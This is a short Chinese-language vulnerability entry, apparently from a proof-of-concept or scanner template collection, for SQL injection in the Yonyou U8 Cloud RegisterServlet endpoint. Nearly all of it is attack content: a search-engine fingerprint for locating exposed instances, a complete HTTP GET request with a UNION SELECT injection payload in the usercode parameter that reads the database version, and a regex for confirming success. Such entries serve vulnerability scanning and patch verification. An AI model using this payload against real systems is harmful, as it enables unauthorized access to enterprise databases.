# 用友U8-nc.bs.sm.login2.RegisterServletSQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd HTTP/1.1`
- **响应特征**：200 ^(?=.*?invalid)(?=.*?Error).*?$